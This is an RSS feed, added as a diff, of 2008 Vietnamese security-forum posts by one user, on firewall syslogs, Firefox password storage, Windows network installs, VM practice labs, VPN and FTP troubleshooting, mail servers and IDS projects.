+				<pubDate><![CDATA[Sun, 5 Oct 2008 09:55:03]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: cho hỏi về report của firewall </title>
+				<description><![CDATA[ Nếu draytek hỗ trợ syslog server thì bạn yên tâm, bất kì syslog server nào cũng đọc được cả. Search Google ra cả đống, nhưng chỉ có một số tool hỗ trợ phân loại log thôi]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24814/150362.hva#150362</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24814/150362.hva#150362</link>
+				<pubDate><![CDATA[Mon, 8 Sep 2008 13:43:38]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Cơ chế lưu mật khẩu của IE, Firefox</title>
+				<description><![CDATA[ Mình nghĩ là hoàn toàn có thể, Firefox dùng PKI để mã hóa dữ liệu thì attacker cũng có thể chôm cả signons.txt lẫn private key để decrypt password.
+
+Và lời cảnh báo là một khi bạn đã nhiễm virus, worm, trojan,... thì máy bạn "chả còn gì để mất nữa" :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/6137/150049.hva#150049</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/6137/150049.hva#150049</link>
+				<pubDate><![CDATA[Sat, 6 Sep 2008 13:49:41]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Cài win cho nhiều máy cùng một lúc ?</title>
+				<description><![CDATA[ Microsoft có công nghệ RIS (Remote Install Service) có thể cài win qua mạng. Nhưng cách nhanh nhất là tạo một bản ghost rồi cho client boot mạng, tranfer file ghost qua rồi tiến hành restore.  Tính ra nếu file ghost khoảng 2GB thì quá trình transfer đến khi ghost xong mất khoảng 10-15'. Nếu ghost mạng nhiều máy cùng lúc thì tốc độ có thể chậm hơn]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24835/150045.hva#150045</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24835/150045.hva#150045</link>
+				<pubDate><![CDATA[Sat, 6 Sep 2008 13:18:28]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Hướng dẫn cài đặt máy ảo trên windwos</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">hongquan_cok wrote:</cite><br>
+		<blockquote>Chào các bạn, mình đã đọc một số bài trong mục <b>thâm nhập</b> về truy nhập máy tính trên internet mình thấy khá hay nên cũng muốn thử. Tuy nhiên mình không muốn chọn một ip bất kì nào đó trên mạng để xâm nhập vì như vậy là xâm phạm và làm phiền họ. Liệu mình có thể cài đặt phầm mềm tạo máy ảo trên máy mình và tự thử truy nhập, kiểm soát máy mình được không. Nếu có thể mong các bạn cho mình chương trình và hướng dẫn sử dụng
+<b>Thank!</b>&nbsp;
+		</blockquote>
+
+Muốn xâm nhập máy tính thì dùng VMware được, còn xâm nhập modem thì phải làm "làm phiền" họ thôi :) Thực tế thì có một số trung tâm an ninh mạng thỉnh thoảng cũng "làm phiền" các ngân hàng đấy
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24799/150018.hva#150018</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24799/150018.hva#150018</link>
+				<pubDate><![CDATA[Sat, 6 Sep 2008 04:08:12]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: cho hỏi về report của firewall </title>
+				<description><![CDATA[ Không biết "report" theo ý của bạn có phải là log của firewall không nhỉ. Nếu đúng thì bạn cấu hình cho draytek "bắn" syslog sang 1 server khác, tại đó dùng syslog server để đọc. ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24814/149922.hva#149922</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24814/149922.hva#149922</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 18:01:50]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Windows XP không tạo được kết nối VPN</title>
+				<description><![CDATA[ Cảm ơn bác, tại cứ cài win xong thấy cái service nào có chữ remote ở đầu là em tắt :-P]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24801/149917.hva#149917</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24801/149917.hva#149917</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 17:45:18]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Không thể truy cập FTP server từ internet!</title>
+				<description><![CDATA[ Sau khi NAT thì bạn vào đây test xem đã ok chưa
+
+http://www.utorrent.com/testport.php?port=21
+
+Chú ý truy cập ngay trên FTP server chứ ko phải từ internet]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24484/149874.hva#149874</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24484/149874.hva#149874</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 13:52:46]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Web Hostin</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">GhostRider wrote:</cite><br>
+		<blockquote>Các bác cho em hỏi chút!
+
+Giữa dịch vụ mail trên web-hosting và mail trên Email Server thì loại nào tốt hơn, ổn định, nhanh hơn?
+
+Em đang phân vân dịch vụ mail giữa Web hosting và Email Server để sử dụng!
+Mong các bác cho lời khuyên!
+&nbsp;
+		</blockquote>
+
+Cần phải cân đối giữa nhu cầu và tài chính. Nếu bạn phục vụ mail cho vài trăm người thì nên làm một mail server riêng, còn nếu ít thì tích hợp luôn vào hosting server.
+
+Một mail server không cần quá chú ý đến tốc độ, delay vài phút cũng không ảnh hưởng gì cả. Chú ý không cấu hình open relay và nên giới hạn số mail/account/phút]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24751/149872.hva#149872</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24751/149872.hva#149872</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 13:47:19]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: HIDS có chức năng Port Scan Detector</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">lehong wrote:</cite><br>
+		<blockquote>Sao chẳng có ai help em hết! 
+Chủ đề của em cũng tương đối hot mà sao chẳng có ai ý kiến giúp em hết?&nbsp;
+		</blockquote>
+
+vậy bạn định lập trình IDS mới hoàn toàn hay base trên hidsbyavinash? Mình cũng có ý định làm đồ án về IPS, nhưng không theo hướng lậpt trình mà chỉ xây dựng các giải pháp dựa trên IDS có sẵn, có gì trao đổi cái nhỉ :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24489/149871.hva#149871</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24489/149871.hva#149871</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 13:38:20]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Windows XP không tạo được kết nối VPN</title>
+				<description><![CDATA[ Tình hình là cả con Windows MCE lẫn máy ảo Windows XP SP2 của em đều bị triệu trứng này, bác nào biết cách khắc phục không ạ? thank a lot
+
+<br>
+			<div align="center" class="limitview"><img src='http://i150.photobucket.com/albums/s115/nhuhoang_bk/bug/FATE0021.jpg' border="0" onload="maxImg(this, 500px);" /></div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24801/149864.hva#149864</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24801/149864.hva#149864</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 13:16:25]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Hỏi về MAC,DAC,RBAC</title>
+				<description><![CDATA[ Zorro trích từ sách nào vậy, mình đã xem qua vài quyển về Sec+ nhưng nói về phần này không rõ lắm]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/6755/138333.hva#138333</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/6755/138333.hva#138333</link>
+				<pubDate><![CDATA[Fri, 27 Jun 2008 10:15:54]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+	</channel>
+</rss>
